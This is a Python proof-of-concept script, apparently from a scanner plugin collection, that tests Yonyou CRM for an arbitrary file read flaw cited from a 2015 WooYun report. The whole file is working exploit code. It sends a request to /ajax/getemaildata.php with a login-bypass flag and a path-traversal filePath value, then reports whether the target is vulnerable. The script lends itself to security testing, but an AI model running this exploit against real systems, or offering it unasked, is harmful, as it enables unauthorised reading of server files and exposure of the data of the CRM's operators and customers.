#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友CRM系统任意文件读取
referer: http://wooyun.org/bugs/wooyun-2015-0137503
author: Lucifer
description: 文件/ajax/getemaildata.php中,参数filePath未过滤存在任意文件读取。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.txt"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"patch" in req.text:
                result[1]=  '存在'
                result[0] = vulnurl
            else:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    